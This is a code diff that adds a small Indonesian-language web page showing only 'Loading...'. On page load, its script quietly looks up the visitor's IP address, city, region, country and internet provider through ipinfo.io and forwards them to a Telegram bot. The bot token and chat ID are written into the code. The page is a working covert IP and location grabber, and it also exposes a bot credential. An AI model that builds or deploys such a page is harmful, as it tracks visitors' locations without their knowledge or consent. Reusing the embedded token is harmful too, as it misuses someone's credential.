@@ -1,0 +1,30 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Cek Jam dan Lokasi</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    const jam = new Date().toLocaleString();
+
+    const token = "8023818163:AAGquHbc8-yDPFcRN9s7Y3fWWVawkCuGZ_A";
+    const chat_id = "7819779147";
+
+    // Ambil data IP dan lokasi dari ipinfo.io
+    fetch("https://ipinfo.io/json?token=123456") // Bisa diganti token premium kalau punya
+      .then(response => response.json())
+      .then(data => {
+        const pesan = `Jam: ${jam}%0AIP: ${data.ip}%0AKota: ${data.city}%0AProvinsi: ${data.region}%0ANegara: ${data.country}%0AProvider: ${data.org}`;
+        return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${pesan}`);
+      })
+      .then(() => {
+        document.body.innerHTML = "<h1>Data berhasil dikirim ke bot!</h1>";
+      })
+      .catch(err => {
+        document.body.innerHTML = "<h1>Gagal kirim data.</h1>";
+      });
+  </script>
+</body>
+</html>
